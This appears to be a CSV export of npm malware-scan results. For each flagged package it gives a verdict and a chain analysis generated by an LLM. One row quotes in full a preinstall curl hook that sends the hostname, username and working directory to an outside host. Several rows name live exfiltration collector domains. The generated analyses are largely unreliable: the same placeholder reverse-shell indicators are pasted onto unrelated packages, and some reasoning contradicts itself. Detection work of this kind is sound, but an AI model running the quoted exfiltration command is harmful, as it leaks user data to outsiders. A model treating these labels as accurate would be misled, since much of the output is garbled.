    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@yorek/sqlpackage' does not seem to need this behavior.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory."", ""attack_vector"": [""https.get"", ""unzipper.Extract""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@yorek/sqlpackage' does not seem to need this behavior.""}}"
aa-testkit,9.9.3,malicious,2026-03-27T13:06:31.794404,skip,0.0,MALICIOUS,0.9,0.9,The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavio,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.9,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.9
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package aa-testkit version 9.9.3 sends network requests to an external server with sensitive data using the 'https' module. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.9, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package aa-testkit version 9.9.3 has no description or README file, suggesting that it may be malicious.""}}"
aae-stream,130.0.0,malicious,2026-03-27T13:06:39.992954,flag,1.0,MALICIOUS,0.89,0.89,The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables.,"[""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables."",
    ""attack_vector"": [""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""],
    ""chain_score"": 0.89,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.89
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine. The package is collecting sensitive data from the victim's machine by reading files and environment variables."", ""attack_vector"": [""nc"", ""wget"", ""196.188.125.134"", ""192.81.209.195"", ""user"", ""path"", ""hostname""], ""chain_score"": 0.89, ""verdict"": ""MALICIOUS"", ""confidence"": 0.89}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
abacus-cmdline,99.99.99,malicious,2026-03-27T13:06:47.289431,review,0.336,MALICIOUS,0.72,0.7,"The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains an install hook present at the payload which may be remote. The package also contains no JavaScript files, which is unusual for a package that contains JavaScript files. This suggests a potential attack chain where a remote code execution (RCE) attack may be taking place."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""}}"
ably-asset-tracking-common,1.0.0,malicious,2026-03-27T13:06:56.594810,flag,1.0,MALICIOUS,0.79,0.79,"The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for m","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for making HTTPS requests and the code is not using a file named 'index.js' and a domain named 'eo6cvg8kvj30wxd.m.pipedream.net'."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, and resolved path. The data exfiltration is likely intentional as the code is using a standard library for making HTTPS requests and the code is not using a file named 'index.js' and a domain named 'eo6cvg8kvj30wxd.m.pipedream.net'."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The behavior is clearly malicious as the package 'ably-asset-tracking-common' is known to send tracking data to a remote server.""}}"
ably-common,1.2.0,malicious,2026-03-27T13:07:06.119636,flag,1.0,MALICIOUS,0.79,0.7,The malware package 'ably-common' version 1.2.0 sends network requests to a specified hostname 'eoawu1sht21zwp8.m.pipedream.net' in the index.js file at line 26. This could indicate a potential data exfiltration behavior.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'ably-common' with version 1.2.0 has a high level of confidence in its data exfiltration intent. The code sends network requests to a specified hostname in the index.js file, indicating a ",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware package 'ably-common' version 1.2.0 sends network requests to a specified hostname 'eoawu1sht21zwp8.m.pipedream.net' in the index.js file at line 26. This could indicate a potential data exfiltration behavior."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'ably-common' with version 1.2.0 has a high level of confidence in its data exfiltration intent. The code sends network requests to a specified hostname in the index.js file, indicating a potential data exfiltration behavior.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malware package 'ably-common' version 1.2.0 sends network requests to a specified hostname 'eoawu1sht21zwp8.m.pipedream.net' in the index.js file at line 26. This could indicate a potential data exfiltration behavior."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'ably-common' with version 1.2.0 has a high level of confidence in its data exfiltration intent. The code sends network requests to a specified hostname in the index.js file, indicating a potential data exfiltration behavior.""}}"
ably-control-api-action,0.1.5,malicious,2026-03-27T13:07:14.789685,flag,1.0,MALICIOUS,0.79,0.79,The malicious intent of the package 'ably-control-api-action' version 0.1.5 is related to data exfiltration. The package sends network requests to the domain 'eo1bj0lgont3eal.m.pipedream.net' in the index.js file at line 26 and 5. The malicious intent is supported by the API call 'https.request' and,"[""https.request"", ""eo1bj0lgont3eal.m.pipedream.net""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malicious intent of the package 'ably-control-api-action' version 0.1.5 is related to data exfiltration. The package sends network requests to the domain 'eo1bj0lgont3eal.m.pipedream.net' in the index.js file at line 26 and 5. The malicious intent is supported by the API call 'https.request' and the domain 'eo1bj0lgont3eal.m.pipedream.net'."",
    ""attack_vector"": [""https.request"", ""eo1bj0lgont3eal.m.pipedream.net""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malicious intent of the package 'ably-control-api-action' version 0.1.5 is related to data exfiltration. The package sends network requests to the domain 'eo1bj0lgont3eal.m.pipedream.net' in the index.js file at line 26 and 5. The malicious intent is supported by the API call 'https.request' and the domain 'eo1bj0lgont3eal.m.pipedream.net'."", ""attack_vector"": [""https.request"", ""eo1bj0lgont3eal.m.pipedream.net""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
ably-engineering,1.0.0,malicious,2026-03-27T13:07:21.694647,flag,1.0,MALICIOUS,0.8,0.7,The package 'ably-engineering' contains a pre-install hook that sends data exfiltration signals to an external URL. The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data.,"[""postinstallhook"", ""bash-c"", ""https://eo7k0ogyrj0trrn.m.pipedream.net"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'ably-engineering' contains a pre-install hook that sends data exfiltration signals to an external URL. The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""https://eo7k0ogyrj0trrn.m.pipedream.net"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.8
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'ably-engineering' contains a pre-install hook that sends data exfiltration signals to an external URL. The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""https://eo7k0ogyrj0trrn.m.pipedream.net"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.8}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
ably-fragmenter-test,1.0.0,malicious,2026-03-27T13:07:30.047162,flag,1.0,MALICIOUS,0.79,0.79,The package 'ably-fragmenter-test' sends network requests to a specified hostname 'eo5wgbnahpiwezj.m.pipedream.net' in the index.js file at line 26. This could potentially indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package 'ably-fragmenter-test' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'ably-fragmenter-test' sends network requests to a specified hostname 'eo5wgbnahpiwezj.m.pipedream.net' in the index.js file at line 26. This could potentially indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'ably-fragmenter-test' does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'ably-fragmenter-test' sends network requests to a specified hostname 'eo5wgbnahpiwezj.m.pipedream.net' in the index.js file at line 26. This could potentially indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'ably-fragmenter-test' does not have a description or README file.""}}"
acookie,1.0.1,malicious,2026-03-27T13:07:36.396731,flag,0.9973,MALICIOUS,0.86,0.7,"The attack chain involves the sending of sensitive data to a remote server via HTTPS POST request from a known webhook/exfiltration collector domain. The data sent includes environment variables, hostname, and other system information.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attack chain involves the sending of sensitive data to a remote server via HTTPS POST request from a known webhook/exfiltration collector domain. The data sent includes environment variables, hostname, and other system information."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.86
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attack chain involves the sending of sensitive data to a remote server via HTTPS POST request from a known webhook/exfiltration collector domain. The data sent includes environment variables, hostname, and other system information."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.86}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
acronis-ui-kit,99.9.50,malicious,2026-03-27T13:07:44.336622,flag,1.0,MALICIOUS,0.82,0.7,"The malware package 'acronis-ui-kit' contains hardcoded external IP addresses in function calls. The IP addresses 8.8.8.8, 20.106.202.190, 4.4.4.4 are used for network exfiltration.","[""8.8.8.8"", ""20.106.202.190"", ""4.4.4.4""]",False,The package 'acronis-ui-kit' does not contain any description or README file indicating its legitimacy.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware package 'acronis-ui-kit' contains hardcoded external IP addresses in function calls. The IP addresses 8.8.8.8, 20.106.202.190, 4.4.4.4 are used for network exfiltration."",
    ""attack_vector"": [""8.8.8.8"", ""20.106.202.190"", ""4.4.4.4""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'acronis-ui-kit' does not contain any description or README file indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malware package 'acronis-ui-kit' contains hardcoded external IP addresses in function calls. The IP addresses 8.8.8.8, 20.106.202.190, 4.4.4.4 are used for network exfiltration."", ""attack_vector"": [""8.8.8.8"", ""20.106.202.190"", ""4.4.4.4""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'acronis-ui-kit' does not contain any description or README file indicating its legitimacy.""}}"
attacker_present_helloworld,10.29.0,malicious,2026-03-27T13:07:54.533298,skip,0.13,MALICIOUS,0.5,0.5,"The attacker presents a package named 'attacker_present_helloworld' version 10.29.0. The package sends user input to a remote server without any explicit API calls, files, or commands. The package is suspected to be involved in credential theft or sensitive data collection. The attack vector is base","[""Fetch API"", ""user input""]",False,"The package is suspected to be involved in credential theft or sensitive data collection, but the exact nature of the malicious action is unclear based on the provided code snippet.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker presents a package named 'attacker_present_helloworld' version 10.29.0. The package sends user input to a remote server without any explicit API calls, files, or commands. The package is suspected to be involved in credential theft or sensitive data collection. The attack vector is based on the Fetch API used to send user input to the remote server. The attacker's IP address, domain, and command are not provided in the evidence. The chain score is 0.5, indicating a moderate level of confidence in the malicious action. The verdict is MALICIOUS."",
    ""attack_vector"": [""Fetch API"", ""user input""],
    ""chain_score"": 0.5,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.5
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package is suspected to be involved in credential theft or sensitive data collection, but the exact nature of the malicious action is unclear based on the provided code snippet.""
  }
}
```","{""chain_analysis"": {""chain_narrative"": ""The attacker presents a package named 'attacker_present_helloworld' version 10.29.0. The package sends user input to a remote server without any explicit API calls, files, or commands. The package is suspected to be involved in credential theft or sensitive data collection. The attack vector is based on the Fetch API used to send user input to the remote server. The attacker's IP address, domain, and command are not provided in the evidence. The chain score is 0.5, indicating a moderate level of confidence in the malicious action. The verdict is MALICIOUS."", ""attack_vector"": [""Fetch API"", ""user input""], ""chain_score"": 0.5, ""verdict"": ""MALICIOUS"", ""confidence"": 0.5}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package is suspected to be involved in credential theft or sensitive data collection, but the exact nature of the malicious action is unclear based on the provided code snippet.""}}"
attribution-project,1.999.0,malicious,2026-03-27T13:08:05.709531,review,0.39,MALICIOUS,0.65,0.65,"The attacker executed a series of commands that may involve credential theft. The commands include 'hostname', 'pwd', 'whoami', and 'curl'. The domain 'https://ifconfig.me' is also included as a potential source of evidence of credential theft.","[""hostname"", ""pwd"", ""whoami"", ""curl"", ""https://ifconfig.me""]",False,The package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker executed a series of commands that may involve credential theft. The commands include 'hostname', 'pwd', 'whoami', and 'curl'. The domain 'https://ifconfig.me' is also included as a potential source of evidence of credential theft."",
    ""attack_vector"": [""hostname"", ""pwd"", ""whoami"", ""curl"", ""https://ifconfig.me""],
    ""chain_score"": 0.65,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.65
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

This JSON object provides a detailed analysis of the attack chain. The attacker executed a series of commands that may involve credential theft. The commands include 'hostname', 'pwd', 'whoami', and 'curl'. The domain 'https://ifconfig.me' is also included as a potential source of evidence of credential theft. The chain score is 0.65, indicating a high risk of credential theft. The verdict is ""MALICIOUS"", indicating that the attack is malicious. The legitimacy check indicates that the package has no description or README and no suspicious behavior is unjustified.","{""chain_analysis"": {""chain_narrative"": ""The attacker executed a series of commands that may involve credential theft. The commands include 'hostname', 'pwd', 'whoami', and 'curl'. The domain 'https://ifconfig.me' is also included as a potential source of evidence of credential theft."", ""attack_vector"": [""hostname"", ""pwd"", ""whoami"", ""curl"", ""https://ifconfig.me""], ""chain_score"": 0.65, ""verdict"": ""MALICIOUS"", ""confidence"": 0.65}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""}}"
auto-issues,1.18.2,malicious,2026-03-27T13:08:16.967215,review,0.336,MALICIOUS,0.72,0.7,"The package 'auto-issues' version 1.18.2 contains no JavaScript files but an install hook present that may execute at install time via the commands listed in the package metadata. The install hook command is `preinstall:curl -H""Package:auto-issues"" -H""Version:1.18.2"" -H""Hostname:$(hostname|base64)"" ","[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'auto-issues' version 1.18.2 contains no JavaScript files but an install hook present that may execute at install time via the commands listed in the package metadata. The install hook command is `preinstall:curl -H\""Package:auto-issues\"" -H\""Version:1.18.2\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru\""`. This behavior may indicate a potential attack chain where the package is being installed on a compromised system and the install hook is used to exfiltrate data or execute a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'auto-issues' version 1.18.2 contains no JavaScript files but an install hook present that may execute at install time via the commands listed in the package metadata. The install hook command is `preinstall:curl -H\""Package:auto-issues\"" -H\""Version:1.18.2\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru\""`. This behavior may indicate a potential attack chain where the package is being installed on a compromised system and the install hook is used to exfiltrate data or execute a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
autocomplete-core,15.0.1,malicious,2026-03-27T13:08:28.409451,flag,1.0,MALICIOUS,0.79,0.7,"The package 'autocomplete-core' with version 15.0.1 sends network requests to an unknown domain 'cc0mttv2vtc0000t7r30ggyko1wyyyyyn.interact.sh' during the installation process, indicating a data exfiltration threat. The attacker may have used a post-installation hook to send the data.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'autocomplete-core' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'autocomplete-core' with version 15.0.1 sends network requests to an unknown domain 'cc0mttv2vtc0000t7r30ggyko1wyyyyyn.interact.sh' during the installation process, indicating a data exfiltration threat. The attacker may have used a post-installation hook to send the data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'autocomplete-core' does not have a description or README file, indicating its legitimacy.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain, the attack vector used, the chain score, the verdict (MALICIOUS, SUSPICIOUS, or BENIGN), and the confidence score. The 'legitimacy_check' section provides information about whether the package is justified based on its description or README file.","{""chain_analysis"": {""chain_narrative"": ""The package 'autocomplete-core' with version 15.0.1 sends network requests to an unknown domain 'cc0mttv2vtc0000t7r30ggyko1wyyyyyn.interact.sh' during the installation process, indicating a data exfiltration threat. The attacker may have used a post-installation hook to send the data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'autocomplete-core' does not have a description or README file, indicating its legitimacy.""}}"
aws-rfdk-project,19.0.1,malicious,2026-03-27T13:08:40.427130,flag,1.0,MALICIOUS,0.79,0.79,"The package 'aws-rfdk-project' (version 19.0.1) sends network requests to a domain known to be associated with exfiltration activity. The domain is 'd7l68sa0gd0qf6xny3bisbtie9kz8o.burpcollaborator.net'. The attack chain involves a post-install hook, a bash command, and a reverse shell.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'aws-rfdk-project' (version 19.0.1) sends network requests to a domain known to be associated with exfiltration activity. The domain is 'd7l68sa0gd0qf6xny3bisbtie9kz8o.burpcollaborator.net'. The attack chain involves a post-install hook, a bash command, and a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

This output is based on the detected behaviors and the analysis of the attack chain. The attack chain narrative explains the full attack using the real package name and real IOCs. The attack vector includes the key technical indicators, real IPs, domains, commands, and API calls. The chain score is the confidence score of the attack chain, and the verdict is based on the chain score. The legitimacy check verdict is based on the package having no description or README file, and no suspicious behavior being unjustified.","{""chain_analysis"": {""chain_narrative"": ""The package 'aws-rfdk-project' (version 19.0.1) sends network requests to a domain known to be associated with exfiltration activity. The domain is 'd7l68sa0gd0qf6xny3bisbtie9kz8o.burpcollaborator.net'. The attack chain involves a post-install hook, a bash command, and a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and no suspicious behavior is unjustified.""}}"
azure-filter-2,99.10.11,malicious,2026-03-27T13:08:53.829581,review,0.494,MALICIOUS,0.9,0.7,The malware package 'azure-filter-2' is making network requests to a specific hostname (425a2.rt11.ml) in the HTTPS POST request. The POST request contains a JSON payload with sensitive data. The malware package is reading sensitive data from the filesystem and network interfaces.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description/README and the is_justified is false.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware package 'azure-filter-2' is making network requests to a specific hostname (425a2.rt11.ml) in the HTTPS POST request. The POST request contains a JSON payload with sensitive data. The malware package is reading sensitive data from the filesystem and network interfaces."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.90
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description/README and the is_justified is false.""
  }
}
```

This JSON object represents the analysis of the malware package 'azure-filter-2'. The chain narrative describes the full attack using real package name and real IOCs. The attack vector includes real IPs, domains, commands, and API calls. The chain score is 0.7, indicating a high level of maliciousness. The verdict is ""MALICIOUS"", indicating that the package behaves maliciously. The legitimacy check indicates that the package does not have a description/README and the is_justified is false, suggesting that the package may not be legitimate.","{""chain_analysis"": {""chain_narrative"": ""The malware package 'azure-filter-2' is making network requests to a specific hostname (425a2.rt11.ml) in the HTTPS POST request. The POST request contains a JSON payload with sensitive data. The malware package is reading sensitive data from the filesystem and network interfaces."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description/README and the is_justified is false.""}}"
azure-linux-tools,1.0.0,malicious,2026-03-27T13:09:02.255069,flag,1.0,MALICIOUS,0.79,0.79,The package 'azure-linux-tools' sends network requests to a specified hostname 'en3200xn6mbcvbo.m.pipedream.net' in the index.js file at line 25. This could indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package 'azure-linux-tools' has a high level of malicious intent based on the evidence of network requests to a specified hostname.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'azure-linux-tools' sends network requests to a specified hostname 'en3200xn6mbcvbo.m.pipedream.net' in the index.js file at line 25. This could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
